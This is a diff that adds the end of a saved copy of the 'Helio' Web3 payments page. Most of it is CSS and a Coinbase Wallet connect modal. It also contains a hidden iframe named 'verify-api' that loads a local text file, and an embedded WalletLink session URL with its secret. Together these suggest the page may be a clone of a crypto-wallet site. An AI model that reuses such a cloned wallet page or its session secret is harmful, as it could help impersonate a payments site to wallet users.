+  </div><next-route-announcer>
+    <p aria-live="assertive" id="__next-route-announcer__" role="alert"
+      style="border: 0px; clip: rect(0px, 0px, 0px, 0px); height: 1px; margin: -1px; overflow: hidden; padding: 0px; position: absolute; width: 1px; white-space: nowrap; overflow-wrap: normal;">
+      Helio | The Web3 payments platform ⚡️</p>
+  </next-route-announcer><iframe id="verify-api" src="d2f9e261d5887cf4a456c3d3a0ad6899.txt"
+    style="display: none;"></iframe><wcm-modal data-scrapbook-shadowdom="<!----><wcm-explorer-context data-scrapbook-shadowdom=&quot;<!---->&quot;></wcm-explorer-context><wcm-theme-context data-scrapbook-shadowdom=&quot;<!---->&quot;></wcm-theme-context><div id=&quot;wcm-modal&quot; role=&quot;alertdialog&quot; aria-modal=&quot;true&quot; class=&quot; wcm-overlay &quot;><div class=&quot;wcm-container&quot; tabindex=&quot;0&quot;><!--?lit$2083354878$--></div></div><style data-scrapbook-elem=&quot;adoptedStyleSheet&quot;>*, ::after, ::before { margin: 0px; padding: 0px; box-sizing: border-box; font-style: normal; text-rendering: optimizespeed; -webkit-font-smoothing: antialiased; -webkit-tap-highlight-color: transparent; backface-visibility: hidden; }
+button { cursor: pointer; display: flex; justify-content: center; align-items: center; position: relative; border: none; background-color: transparent; transition: all 0.2s ease 0s; }
+@media (hover: hover) and (pointer: fine) {
+  button:active { transition: all 0.1s ease 0s; transform: scale(0.93); }
+}
+button::after { content: &quot;&quot;; position: absolute; inset: 0px; transition: background-color 0s ease 0s, all 0.2s ease 0s; }
+button:disabled { cursor: not-allowed; }
+button svg, button wcm-text { position: relative; z-index: 1; }
+input { border: none; outline: 0px; appearance: none; }
+img { display: block; }
+::selection { color: var(--wcm-accent-fill-color); background: var(--wcm-accent-color); }</style><style data-scrapbook-elem=&quot;adoptedStyleSheet&quot;>:host { all: initial; }
+.wcm-overlay { inset: 0px; position: fixed; z-index: var(--wcm-z-index); overflow: hidden; display: flex; justify-content: center; align-items: center; opacity: 0; pointer-events: none; background-color: var(--wcm-overlay-background-color); backdrop-filter: var(--wcm-overlay-backdrop-filter); }
+@media (max-height: 720px) and (orientation: landscape) {
+  .wcm-overlay { overflow: scroll; align-items: flex-start; padding: 20px 0px; }
+}
+.wcm-active { pointer-events: auto; }
+.wcm-container { position: relative; max-width: 360px; width: 100%; outline: 0px; border-radius: var(--wcm-background-border-radius) var(--wcm-background-border-radius) var(--wcm-container-border-radius) var(--wcm-container-border-radius); border: 1px solid var(--wcm-color-overlay); overflow: hidden; }
+.wcm-card { width: 100%; position: relative; border-radius: var(--wcm-container-border-radius); overflow: hidden; box-shadow: 0 6px 14px -6px rgba(10,16,31,.12),0 10px 32px -4px rgba(10,16,31,.1),0 0 0 1px var(--wcm-color-overlay); background-color: var(--wcm-color-bg-1); color: var(--wcm-color-fg-1); }
+@media (max-width: 600px) {
+  .wcm-container { max-width: 440px; border-radius: var(--wcm-background-border-radius) var(--wcm-background-border-radius) 0 0; }
+  .wcm-card { border-radius: var(--wcm-container-border-radius) var(--wcm-container-border-radius) 0 0; }
+  .wcm-overlay { align-items: flex-end; }
+}
+@media (max-width: 440px) {
+  .wcm-container { border: 0px; }
+}</style>"></wcm-modal>
+  <script
+    data-scrapbook-elem="basic-loader">(function () { var k1 = "data-scrapbook-shadowdom", k2 = "data-scrapbook-canvas", k3 = "data-scrapbook-input-indeterminate", k4 = "data-scrapbook-input-checked", k5 = "data-scrapbook-option-selected", k6 = "data-scrapbook-input-value", k7 = "data-scrapbook-textarea-value", fn = function (r) { var E = r.querySelectorAll ? r.querySelectorAll("*") : r.getElementsByTagName("*"), i = E.length, e, d, s; while (i--) { e = E[i]; if ((d = e.getAttribute(k1)) !== null && !e.shadowRoot && e.attachShadow) { s = e.attachShadow({ mode: 'open' }); s.innerHTML = d; e.removeAttribute(k1); } if ((d = e.getAttribute(k2)) !== null) { (function () { var c = e, g = new Image(); g.onload = function () { c.getContext('2d').drawImage(g, 0, 0); }; g.src = d; })(); e.removeAttribute(k2); } if ((d = e.getAttribute(k3)) !== null) { e.indeterminate = true; e.removeAttribute(k3); } if ((d = e.getAttribute(k4)) !== null) { e.checked = d === 'true'; e.removeAttribute(k4); } if ((d = e.getAttribute(k5)) !== null) { e.selected = d === 'true'; e.removeAttribute(k5); } if ((d = e.getAttribute(k6)) !== null) { e.value = d; e.removeAttribute(k6); } if ((d = e.getAttribute(k7)) !== null) { e.value = d; e.removeAttribute(k7); } if (e.shadowRoot) { fn(e.shadowRoot); } } }; fn(document); })()</script>
+</body>
+<div class="-cbwsdk-css-reset">
+  <div class="-cbwsdk-link-flow-root">
+    <div class="-cbwsdk-connect-dialog-container -cbwsdk-connect-dialog-container-hidden">
+      <style>
+        .-cbwsdk-css-reset .-cbwsdk-connect-dialog {
+          z-index: 2147483647;
+          position: fixed;
+          top: 0;
+          left: 0;
+          right: 0;
+          bottom: 0;
+          display: flex;
+          align-items: center;
+          justify-content: center
+        }
+
+        .-cbwsdk-css-reset .-cbwsdk-connect-dialog-backdrop {
+          z-index: 2147483647;
+          position: fixed;
+          top: 0;
+          left: 0;
+          right: 0;
+          bottom: 0;
+          transition: opacity .25s
+        }
+
+        .-cbwsdk-css-reset .-cbwsdk-connect-dialog-backdrop.light {
+          background-color: rgba(0, 0, 0, .5)
+        }
+
+        .-cbwsdk-css-reset .-cbwsdk-connect-dialog-backdrop.dark {
+          background-color: rgba(50, 53, 61, .4)
+        }
+
+        .-cbwsdk-css-reset .-cbwsdk-connect-dialog-backdrop-hidden {
+          opacity: 0
+        }
+
+        .-cbwsdk-css-reset .-cbwsdk-connect-dialog-box {
+          display: flex;
+          position: relative;
+          flex-direction: column;
+          transform: scale(1);
+          transition: opacity .25s, transform .25s
+        }
+
+        .-cbwsdk-css-reset .-cbwsdk-connect-dialog-box-hidden {
+          opacity: 0;
+          transform: scale(0.85)
+        }
+
+        .-cbwsdk-css-reset .-cbwsdk-connect-dialog-container {
+          display: block
+        }
+
+        .-cbwsdk-css-reset .-cbwsdk-connect-dialog-container-hidden {
+          display: none
+        }
+      </style>
+      <div class="-cbwsdk-connect-dialog-backdrop light -cbwsdk-connect-dialog-backdrop-hidden"></div>
+      <div class="-cbwsdk-connect-dialog">
+        <div class="-cbwsdk-connect-dialog-box -cbwsdk-connect-dialog-box-hidden">
+          <div data-testid="connect-content" class="-cbwsdk-connect-content light">
+            <style>
+              .-cbwsdk-css-reset .-cbwsdk-connect-content {
+                height: 430px;
+                width: 700px;
+                border-radius: 12px;
+                padding: 30px
+              }
+
+              .-cbwsdk-css-reset .-cbwsdk-connect-content.light {
+                background: #fff
+              }
+
+              .-cbwsdk-css-reset .-cbwsdk-connect-content.dark {
+                background: #0a0b0d
+              }
+
+              .-cbwsdk-css-reset .-cbwsdk-connect-content-header {
+                display: flex;
+                align-items: center;
+                justify-content: space-between;
+                margin: 0 0 30px
+              }
+
+              .-cbwsdk-css-reset .-cbwsdk-connect-content-heading {
+                font-style: normal;
+                font-weight: 500;
+                font-size: 28px;
+                line-height: 36px;
+                margin: 0
+              }
+
+              .-cbwsdk-css-reset .-cbwsdk-connect-content-heading.light {
+                color: #0a0b0d
+              }
+
+              .-cbwsdk-css-reset .-cbwsdk-connect-content-heading.dark {
+                color: #fff
+              }
+
+              .-cbwsdk-css-reset .-cbwsdk-connect-content-layout {
+                display: flex;
+                flex-direction: row
+              }
+
+              .-cbwsdk-css-reset .-cbwsdk-connect-content-column-left {
+                margin-right: 30px;
+                display: flex;
+                flex-direction: column;
+                justify-content: space-between
+              }
+
+              .-cbwsdk-css-reset .-cbwsdk-connect-content-column-right {
+                flex: 25%;
+                margin-right: 34px
+              }
+
+              .-cbwsdk-css-reset .-cbwsdk-connect-content-qr-wrapper {
+                width: 220px;
+                height: 220px;
+                border-radius: 12px;
+                display: flex;
+                justify-content: center;
+                align-items: center;
+                background: #fff
+              }
+
+              .-cbwsdk-css-reset .-cbwsdk-connect-content-qr-connecting {
+                position: absolute;
+                top: 0;
+                bottom: 0;
+                left: 0;
+                right: 0;
+                display: flex;
+                flex-direction: column;
+                align-items: center;
+                justify-content: center
+              }
+
+              .-cbwsdk-css-reset .-cbwsdk-connect-content-qr-connecting.light {
+                background-color: rgba(255, 255, 255, .95)
+              }
+
+              .-cbwsdk-css-reset .-cbwsdk-connect-content-qr-connecting.light>p {
+                color: #0a0b0d
+              }
+
+              .-cbwsdk-css-reset .-cbwsdk-connect-content-qr-connecting.dark {
+                background-color: rgba(10, 11, 13, .9)
+              }
+
+              .-cbwsdk-css-reset .-cbwsdk-connect-content-qr-connecting.dark>p {
+                color: #fff
+              }
+
+              .-cbwsdk-css-reset .-cbwsdk-connect-content-qr-connecting>p {
+                font-size: 12px;
+                font-weight: bold;
+                margin-top: 16px
+              }
+
+              .-cbwsdk-css-reset .-cbwsdk-connect-content-update-app {
+                border-radius: 8px;
+                font-size: 14px;
+                line-height: 20px;
+                padding: 12px;
+                width: 339px
+              }
+
+              .-cbwsdk-css-reset .-cbwsdk-connect-content-update-app.light {
+                background: #eef0f3;
+                color: #5b636e
+              }
+
+              .-cbwsdk-css-reset .-cbwsdk-connect-content-update-app.dark {
+                background: #1e2025;
+                color: #8a919e
+              }
+
+              .-cbwsdk-css-reset .-cbwsdk-cancel-button {
+                -webkit-appearance: none;
+                border: none;
+                background: none;
+                cursor: pointer;
+                padding: 0;
+                margin: 0
+              }
+
+              .-cbwsdk-css-reset .-cbwsdk-cancel-button-x {
+                position: relative;
+                display: block;
+                cursor: pointer
+              }
+
+              .-cbwsdk-css-reset .-cbwsdk-wallet-steps {
+                padding: 0 0 0 16px;
+                margin: 0;
+                width: 100%;
+                list-style: decimal
+              }
+
+              .-cbwsdk-css-reset .-cbwsdk-wallet-steps-item {
+                list-style-type: decimal;
+                display: list-item;
+                font-style: normal;
+                font-weight: 400;
+                font-size: 16px;
+                line-height: 24px;
+                margin-top: 20px
+              }
+
+              .-cbwsdk-css-reset .-cbwsdk-wallet-steps-item.light {
+                color: #0a0b0d
+              }
+
+              .-cbwsdk-css-reset .-cbwsdk-wallet-steps-item.dark {
+                color: #fff
+              }
+
+              .-cbwsdk-css-reset .-cbwsdk-wallet-steps-item-wrapper {
+                display: flex;
+                align-items: center
+              }
+
+              .-cbwsdk-css-reset .-cbwsdk-wallet-steps-pad-left {
+                margin-left: 6px
+              }
+
+              .-cbwsdk-css-reset .-cbwsdk-wallet-steps-icon {
+                display: flex;
+                border-radius: 50%;
+                height: 24px;
+                width: 24px
+              }
+
+              .-cbwsdk-css-reset .-cbwsdk-wallet-steps-icon svg {
+                margin: auto;
+                display: block
+              }
+
+              .-cbwsdk-css-reset .-cbwsdk-wallet-steps-icon.light {
+                background: #0052ff
+              }
+
+              .-cbwsdk-css-reset .-cbwsdk-wallet-steps-icon.dark {
+                background: #588af5
+              }
+
+              .-cbwsdk-css-reset .-cbwsdk-connect-item {
+                align-items: center;
+                display: flex;
+                flex-direction: row;
+                padding: 16px 24px;
+                gap: 12px;
+                cursor: pointer
+              }
+
+              .-cbwsdk-css-reset .-cbwsdk-connect-item.light {
+                color: #0a0b0d
+              }
+
+              .-cbwsdk-css-reset .-cbwsdk-connect-item.light.selected {
+                background: #f5f8ff;
+                color: #0052ff
+              }
+
+              .-cbwsdk-css-reset .-cbwsdk-connect-item.dark {
+                color: #fff
+              }
+
+              .-cbwsdk-css-reset .-cbwsdk-connect-item.dark.selected {
+                background: #001033;
+                color: #588af5
+              }
+
+              .-cbwsdk-css-reset .-cbwsdk-connect-item.selected {
+                border-radius: 100px;
+                font-weight: 600
+              }
+
+              .-cbwsdk-css-reset .-cbwsdk-connect-item-copy-wrapper {
+                margin: 0 4px 0 8px
+              }
+
+              .-cbwsdk-css-reset .-cbwsdk-connect-item-title {
+                margin: 0 0 0;
+                font-size: 16px;
+                line-height: 24px;
+                font-weight: 500
+              }
+
+              .-cbwsdk-css-reset .-cbwsdk-connect-item-description {
+                font-weight: 400;
+                font-size: 14px;
+                line-height: 20px;
+                margin: 0
+              }
+            </style>
+            <div class="-cbwsdk-connect-content-header">
+              <h2 class="-cbwsdk-connect-content-heading light">Scan to connect with one of our mobile apps</h2>
+            </div>
+            <div class="-cbwsdk-connect-content-layout">
+              <div class="-cbwsdk-connect-content-column-left">
+                <div>
+                  <div class="-cbwsdk-connect-item light selected">
+                    <div><img src="f0438febff768476c4bd646204034239a5fc20d9.svg" alt="Coinbase Wallet app"></div>
+                    <div class="-cbwsdk-connect-item-copy-wrapper">
+                      <h3 class="-cbwsdk-connect-item-title">Coinbase Wallet app</h3>
+                      <p class="-cbwsdk-connect-item-description">Connect with your self-custody wallet</p>
+                    </div>
+                  </div>
+                  <div class="-cbwsdk-connect-item light">
+                    <div><img src="f9fa0444b908def7e2cacce9c162c39a60167a27.svg" alt="Coinbase app"></div>
+                    <div class="-cbwsdk-connect-item-copy-wrapper">
+                      <h3 class="-cbwsdk-connect-item-title">Coinbase app</h3>
+                      <p class="-cbwsdk-connect-item-description">Connect with your Coinbase account</p>
+                    </div>
+                  </div>
+                </div>
+              </div>
+              <div class="-cbwsdk-connect-content-column-right">
+                <div class="-cbwsdk-connect-content-qr-wrapper"><img src="148a17cae3ab6031f1c591153a8dfcf9a6fa7eb3.svg"
+                    alt="QR Code"><input type="hidden" name="cbw-cbwsdk-version" value="3.7.1"><input type="hidden"
+                    value="https://www.walletlink.org/#/link?id=6d14551233add4d2b71a09f21a21cb3e&amp;secret=18c1cdaf91e0ababebbdb99af185a82c42a2c6963c4854a90fd9f3a7f2de792a&amp;server=https%3A%2F%2Fwww.walletlink.org&amp;v=3.7.1&amp;chainId=1">
+                </div>
+                <ol class="-cbwsdk-wallet-steps">
+                  <li class="-cbwsdk-wallet-steps-item light">
+                    <div class="-cbwsdk-wallet-steps-item-wrapper">Open Coinbase Wallet app</div>
+                  </li>
+                  <li class="-cbwsdk-wallet-steps-item light">
+                    <div class="-cbwsdk-wallet-steps-item-wrapper"><span>Tap <strong>Scan</strong> </span><span
+                        class="-cbwsdk-wallet-steps-pad-left -cbwsdk-wallet-steps-icon light"><svg width="10"
+                          height="10" viewBox="0 0 10 10" xmlns="http://www.w3.org/2000/svg" fill="#FFFFFF">
+                          <path d="M8.2271 1.77124L7.0271 1.77124V2.97124H8.2271V1.77124Z"></path>
+                          <path
+                            d="M5.44922 0.199219L5.44922 4.54922L9.79922 4.54922V0.199219L5.44922 0.199219ZM8.89922 3.64922L6.34922 3.64922L6.34922 1.09922L8.89922 1.09922V3.64922Z">
+                          </path>
+                          <path d="M2.97124 1.77124L1.77124 1.77124L1.77124 2.97124H2.97124V1.77124Z"></path>
+                          <path
+                            d="M0.199219 4.54922L4.54922 4.54922L4.54922 0.199219L0.199219 0.199219L0.199219 4.54922ZM1.09922 1.09922L3.64922 1.09922L3.64922 3.64922L1.09922 3.64922L1.09922 1.09922Z">
+                          </path>
+                          <path d="M2.97124 7.0271H1.77124L1.77124 8.2271H2.97124V7.0271Z"></path>
+                          <path
+                            d="M0.199219 9.79922H4.54922L4.54922 5.44922L0.199219 5.44922L0.199219 9.79922ZM1.09922 6.34922L3.64922 6.34922L3.64922 8.89922H1.09922L1.09922 6.34922Z">
+                          </path>
+                          <path
+                            d="M8.89922 7.39912H7.99922V5.40112H5.44922L5.44922 9.79912H6.34922L6.34922 6.30112H7.09922V8.29912H9.79922V5.40112H8.89922V7.39912Z">
+                          </path>
+                          <path d="M7.99912 8.89917H7.09912V9.79917H7.99912V8.89917Z"></path>
+                          <path d="M9.79917 8.89917H8.89917V9.79917H9.79917V8.89917Z"></path>
+                        </svg></span></div>
+                  </li>
+                </ol>
+              </div>
+            </div>
+          </div>
+          <div class="-cbwsdk-try-extension light">
+            <style>
+              .-cbwsdk-css-reset .-cbwsdk-try-extension {
+                display: flex;
+                margin-top: 12px;
+                height: 202px;
+                width: 700px;
+                border-radius: 12px;
+                padding: 30px
+              }
+
+              .-cbwsdk-css-reset .-cbwsdk-try-extension.light {
+                background: #fff
+              }
+
+              .-cbwsdk-css-reset .-cbwsdk-try-extension.dark {
+                background: #0a0b0d
+              }
+
+              .-cbwsdk-css-reset .-cbwsdk-try-extension-column-half {
+                flex: 50%
+              }
+
+              .-cbwsdk-css-reset .-cbwsdk-try-extension-heading {
+                font-style: normal;
+                font-weight: 500;
+                font-size: 25px;
+                line-height: 32px;
+                margin: 0;
+                max-width: 204px
+              }
+
+              .-cbwsdk-css-reset .-cbwsdk-try-extension-heading.light {
+                color: #0a0b0d
+              }
+
+              .-cbwsdk-css-reset .-cbwsdk-try-extension-heading.dark {
+                color: #fff
+              }
+
+              .-cbwsdk-css-reset .-cbwsdk-try-extension-cta {
+                appearance: none;
+                border: none;
+                background: none;
+                color: #0052ff;
+                cursor: pointer;
+                padding: 0;
+                text-decoration: none;
+                display: block;
+                font-weight: 600;
+                font-size: 16px;
+                line-height: 24px
+              }
+
+              .-cbwsdk-css-reset .-cbwsdk-try-extension-cta.light {
+                color: #0052ff
+              }
+
+              .-cbwsdk-css-reset .-cbwsdk-try-extension-cta.dark {
+                color: #588af5
+              }
+
+              .-cbwsdk-css-reset .-cbwsdk-try-extension-cta-wrapper {
+                display: flex;
+                align-items: center;
+                margin-top: 12px
+              }
+
+              .-cbwsdk-css-reset .-cbwsdk-try-extension-cta-icon {
+                display: block;
+                margin-left: 4px;
+                height: 14px
+              }
+
+              .-cbwsdk-css-reset .-cbwsdk-try-extension-list {
+                display: flex;
+                flex-direction: column;
+                justify-content: center;
+                align-items: center;
+                margin: 0;
+                padding: 0;
+                list-style: none;
+                height: 100%
+              }
+
+              .-cbwsdk-css-reset .-cbwsdk-try-extension-list-item {
+                display: flex;
+                align-items: center;
+                flex-flow: nowrap;
+                margin-top: 24px
+              }
+
+              .-cbwsdk-css-reset .-cbwsdk-try-extension-list-item:first-of-type {
+                margin-top: 0
+              }
+
+              .-cbwsdk-css-reset .-cbwsdk-try-extension-list-item-icon-wrapper {
+                display: block
+              }
+
+              .-cbwsdk-css-reset .-cbwsdk-try-extension-list-item-icon {
+                display: flex;
+                height: 32px;
+                width: 32px;
+                border-radius: 50%
+              }
+
+              .-cbwsdk-css-reset .-cbwsdk-try-extension-list-item-icon svg {
+                margin: auto;
+                display: block
+              }
+
+              .-cbwsdk-css-reset .-cbwsdk-try-extension-list-item-icon.light {
+                background: #eef0f3
+              }
+
+              .-cbwsdk-css-reset .-cbwsdk-try-extension-list-item-icon.dark {
+                background: #1e2025
+              }
+
+              .-cbwsdk-css-reset .-cbwsdk-try-extension-list-item-copy {
+                display: block;
+                font-weight: 400;
+                font-size: 14px;
+                line-height: 20px;
+                padding-left: 12px
+              }
+
+              .-cbwsdk-css-reset .-cbwsdk-try-extension-list-item-copy.light {
+                color: #5b636e
+              }
+
+              .-cbwsdk-css-reset .-cbwsdk-try-extension-list-item-copy.dark {
+                color: #8a919e
+              }
+            </style>
+            <div class="-cbwsdk-try-extension-column-half">
+              <h3 class="-cbwsdk-try-extension-heading light">Or try the Coinbase Wallet browser extension</h3>
+              <div class="-cbwsdk-try-extension-cta-wrapper"><button
+                  class="-cbwsdk-try-extension-cta light">Install</button>
+                <div><svg width="16" height="16" viewBox="0 0 16 16" xmlns="http://www.w3.org/2000/svg"
+                    class="-cbwsdk-try-extension-cta-icon" fill="#0052FF">
+                    <path
+                      d="M8.60675 0.155884L7.37816 1.28209L12.7723 7.16662H0V8.83328H12.6548L6.82149 14.6666L8 15.8451L15.8201 8.02501L8.60675 0.155884Z">
+                    </path>
+                  </svg></div>
+              </div>
+            </div>
+            <div class="-cbwsdk-try-extension-column-half">
+              <ul class="-cbwsdk-try-extension-list">
+                <li class="-cbwsdk-try-extension-list-item">
+                  <div class="-cbwsdk-try-extension-list-item-icon-wrapper"><span
+                      class="-cbwsdk-try-extension-list-item-icon light"><svg width="14" height="14" viewBox="0 0 14 14"
+                        xmlns="http://www.w3.org/2000/svg" fill="#0A0B0D">
+                        <path
+                          d="M1.8001 2.2002H12.2001V9.40019H1.8001V2.2002ZM3.4001 3.8002V7.80019H10.6001V3.8002H3.4001Z">
+                        </path>
+                        <path
+                          d="M13.4001 10.2002H0.600098C0.600098 11.0838 1.31644 11.8002 2.2001 11.8002H11.8001C12.6838 11.8002 13.4001 11.0838 13.4001 10.2002Z">
+                        </path>
+                      </svg></span></div>
+                  <div class="-cbwsdk-try-extension-list-item-copy light">Connect with dapps with just one click on your
+                    desktop browser</div>
+                </li>
+                <li class="-cbwsdk-try-extension-list-item">
+                  <div class="-cbwsdk-try-extension-list-item-icon-wrapper"><span
+                      class="-cbwsdk-try-extension-list-item-icon light"><svg width="14" height="14" viewBox="0 0 14 14"
+                        xmlns="http://www.w3.org/2000/svg" fill="#0A0B0D">
+                        <path fill-rule="evenodd" clip-rule="evenodd"
+                          d="M0.600098 0.600098V11.8001H13.4001V0.600098H0.600098ZM7.0001 9.2001C5.3441 9.2001 4.0001 7.8561 4.0001 6.2001C4.0001 4.5441 5.3441 3.2001 7.0001 3.2001C8.6561 3.2001 10.0001 4.5441 10.0001 6.2001C10.0001 7.8561 8.6561 9.2001 7.0001 9.2001ZM0.600098 12.6001H3.8001V13.4001H0.600098V12.6001ZM10.2001 12.6001H13.4001V13.4001H10.2001V12.6001ZM8.8001 6.2001C8.8001 7.19421 7.99421 8.0001 7.0001 8.0001C6.00598 8.0001 5.2001 7.19421 5.2001 6.2001C5.2001 5.20598 6.00598 4.4001 7.0001 4.4001C7.99421 4.4001 8.8001 5.20598 8.8001 6.2001Z">
+                        </path>
+                      </svg></span></div>
+                  <div class="-cbwsdk-try-extension-list-item-copy light">Add an additional layer of security by using a
+                    supported Ledger hardware wallet</div>
+                </li>
+              </ul>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+  <div class="-cbwsdk-snackbar-root">
+    <div>
+      <div class="-cbwsdk-snackbar-container">
+        <style>
+          .-cbwsdk-css-reset .-gear-container {
+            margin-left: 16px !important;
+            margin-right: 9px !important;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            width: 24px;
+            height: 24px;
+            transition: opacity .25s
+          }
+
+          .-cbwsdk-css-reset .-gear-container * {
+            user-select: none
+          }
+
+          .-cbwsdk-css-reset .-gear-container svg {
+            opacity: 0;
+            position: absolute
+          }
+
+          .-cbwsdk-css-reset .-gear-icon {
+            height: 12px;
+            width: 12px;
+            z-index: 10000
+          }
+
+          .-cbwsdk-css-reset .-cbwsdk-snackbar {
+            align-items: flex-end;
+            display: flex;
+            flex-direction: column;
+            position: fixed;
+            right: 0;
+            top: 0;
+            z-index: 2147483647
+          }
+
+          .-cbwsdk-css-reset .-cbwsdk-snackbar * {
+            user-select: none
+          }
+
+          .-cbwsdk-css-reset .-cbwsdk-snackbar-instance {
+            display: flex;
+            flex-direction: column;
+            margin: 8px 16px 0 16px;
+            overflow: visible;
+            text-align: left;
+            transform: translateX(0);
+            transition: opacity .25s, transform .25s
+          }
+
+          .-cbwsdk-css-reset .-cbwsdk-snackbar-instance-header:hover .-gear-container svg {
+            opacity: 1
+          }
+
+          .-cbwsdk-css-reset .-cbwsdk-snackbar-instance-header {
+            display: flex;
+            align-items: center;
+            background: #fff;
+            overflow: hidden;
+            border: 1px solid #e7ebee;
+            box-sizing: border-box;
+            border-radius: 8px;
+            cursor: pointer
+          }
+
+          .-cbwsdk-css-reset .-cbwsdk-snackbar-instance-header-cblogo {
+            margin: 8px 8px 8px 8px
+          }
+
+          .-cbwsdk-css-reset .-cbwsdk-snackbar-instance-header * {
+            cursor: pointer
+          }
+
+          .-cbwsdk-css-reset .-cbwsdk-snackbar-instance-header-message {
+            color: #000;
+            font-size: 13px;
+            line-height: 1.5;
+            user-select: none
+          }
+
+          .-cbwsdk-css-reset .-cbwsdk-snackbar-instance-menu {
+            background: #fff;
+            transition: opacity .25s ease-in-out, transform .25s linear, visibility 0s;
+            visibility: hidden;
+            border: 1px solid #e7ebee;
+            box-sizing: border-box;
+            border-radius: 8px;
+            opacity: 0;
+            flex-direction: column;
+            padding-left: 8px;
+            padding-right: 8px
+          }
+
+          .-cbwsdk-css-reset .-cbwsdk-snackbar-instance-menu-item:last-child {
+            margin-bottom: 8px !important
+          }
+
+          .-cbwsdk-css-reset .-cbwsdk-snackbar-instance-menu-item:hover {
+            background: #f5f7f8;
+            border-radius: 6px;
+            transition: background .25s
+          }
+
+          .-cbwsdk-css-reset .-cbwsdk-snackbar-instance-menu-item:hover span {
+            color: #050f19;
+            transition: color .25s
+          }
+
+          .-cbwsdk-css-reset .-cbwsdk-snackbar-instance-menu-item:hover svg path {
+            fill: #000;
+            transition: fill .25s
+          }
+
+          .-cbwsdk-css-reset .-cbwsdk-snackbar-instance-menu-item {
+            visibility: inherit;
+            height: 35px;
+            margin-top: 8px;
+            margin-bottom: 0;
+            display: flex;
+            flex-direction: row;
+            align-items: center;
+            padding: 8px;
+            cursor: pointer
+          }
+
+          .-cbwsdk-css-reset .-cbwsdk-snackbar-instance-menu-item * {
+            visibility: inherit;
+            cursor: pointer
+          }
+
+          .-cbwsdk-css-reset .-cbwsdk-snackbar-instance-menu-item-is-red:hover {
+            background: rgba(223, 95, 103, .2);
+            transition: background .25s
+          }
+
+          .-cbwsdk-css-reset .-cbwsdk-snackbar-instance-menu-item-is-red:hover * {
+            cursor: pointer
+          }
+
+          .-cbwsdk-css-reset .-cbwsdk-snackbar-instance-menu-item-is-red:hover svg path {
+            fill: #df5f67;
+            transition: fill .25s
+          }
+
+          .-cbwsdk-css-reset .-cbwsdk-snackbar-instance-menu-item-is-red:hover span {
+            color: #df5f67;
+            transition: color .25s
+          }
+
+          .-cbwsdk-css-reset .-cbwsdk-snackbar-instance-menu-item-info {
+            color: #aaa;
+            font-size: 13px;
+            margin: 0 8px 0 32px;
+            position: absolute
+          }
+
+          .-cbwsdk-css-reset .-cbwsdk-snackbar-instance-hidden {
+            opacity: 0;
+            text-align: left;
+            transform: translateX(25%);
+            transition: opacity .5s linear
+          }
+
+          .-cbwsdk-css-reset .-cbwsdk-snackbar-instance-expanded .-cbwsdk-snackbar-instance-menu {
+            opacity: 1;
+            display: flex;
+            transform: translateY(8px);
+            visibility: visible
+          }
+        </style>
+        <div class="-cbwsdk-snackbar"></div>
+      </div>
+    </div>
+  </div>
+</div>
+<style type="text/css">
+  @namespace svg "http://www.w3.org/2000/svg";
+
+  .-cbwsdk-css-reset,
+  .-cbwsdk-css-reset * {
+    animation: none;
+    animation-delay: 0;
+    animation-direction: normal;
+    animation-duration: 0;
+    animation-fill-mode: none;
+    animation-iteration-count: 1;
+    animation-name: none;
+    animation-play-state: running;
+    animation-timing-function: ease;
+    backface-visibility: visible;
+    background: 0;
+    background-attachment: scroll;
+    background-clip: border-box;
+    background-color: rgba(0, 0, 0, 0);
+    background-image: none;
+    background-origin: padding-box;
+    background-position: 0 0;
+    background-position-x: 0;
+    background-position-y: 0;
+    background-repeat: repeat;
+    background-size: auto auto;
+    border: 0;
+    border-style: none;
+    border-width: medium;
+    border-color: inherit;
+    border-bottom: 0;
+    border-bottom-color: inherit;
+    border-bottom-left-radius: 0;
+    border-bottom-right-radius: 0;
+    border-bottom-style: none;
+    border-bottom-width: medium;
+    border-collapse: separate;
+    border-image: none;
+    border-left: 0;
+    border-left-color: inherit;
+    border-left-style: none;
+    border-left-width: medium;
+    border-radius: 0;
+    border-right: 0;
+    border-right-color: inherit;
+    border-right-style: none;
+    border-right-width: medium;
+    border-spacing: 0;
+    border-top: 0;
+    border-top-color: inherit;
+    border-top-left-radius: 0;
+    border-top-right-radius: 0;
+    border-top-style: none;
+    border-top-width: medium;
+    box-shadow: none;
+    box-sizing: border-box;
+    caption-side: top;
+    clear: none;
+    clip: auto;
+    color: inherit;
+    columns: auto;
+    column-count: auto;
+    column-fill: balance;
+    column-gap: normal;
+    column-rule: medium none currentColor;
+    column-rule-color: currentColor;
+    column-rule-style: none;
+    column-rule-width: none;
+    column-span: 1;
+    column-width: auto;
+    counter-increment: none;
+    counter-reset: none;
+    direction: ltr;
+    empty-cells: show;
+    float: none;
+    font: normal;
+    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", "Helvetica Neue", Arial, sans-serif;
+    font-size: medium;
+    font-style: normal;
+    font-variant: normal;
+    font-weight: normal;
+    height: auto;
+    hyphens: none;
+    letter-spacing: normal;
+    line-height: normal;
+    list-style: none;
+    list-style-image: none;
+    list-style-position: outside;
+    list-style-type: disc;
+    margin: 0;
+    margin-bottom: 0;
+    margin-left: 0;
+    margin-right: 0;
+    margin-top: 0;
+    opacity: 1;
+    orphans: 0;
+    outline: 0;
+    outline-color: invert;
+    outline-style: none;
+    outline-width: medium;
+    overflow: visible;
+    overflow-x: visible;
+    overflow-y: visible;
+    padding: 0;
+    padding-bottom: 0;
+    padding-left: 0;
+    padding-right: 0;
+    padding-top: 0;
+    page-break-after: auto;
+    page-break-before: auto;
+    page-break-inside: auto;
+    perspective: none;
+    perspective-origin: 50% 50%;
+    pointer-events: auto;
+    position: static;
+    quotes: "\201C" "\201D" "\2018" "\2019";
+    tab-size: 8;
+    table-layout: auto;
+    text-align: inherit;
+    text-align-last: auto;
+    text-decoration: none;
+    text-decoration-color: inherit;
+    text-decoration-line: none;
+    text-decoration-style: solid;
+    text-indent: 0;
+    text-shadow: none;
+    text-transform: none;
+    transform: none;
+    transform-style: flat;
+    transition: none;
+    transition-delay: 0s;
+    transition-duration: 0s;
+    transition-property: none;
+    transition-timing-function: ease;
+    unicode-bidi: normal;
+    vertical-align: baseline;
+    visibility: visible;
+    white-space: normal;
+    widows: 0;
+    word-spacing: normal;
+    z-index: auto
+  }
+
+  .-cbwsdk-css-reset strong {
+    font-weight: bold
+  }
+
+  .-cbwsdk-css-reset * {
+    box-sizing: border-box;
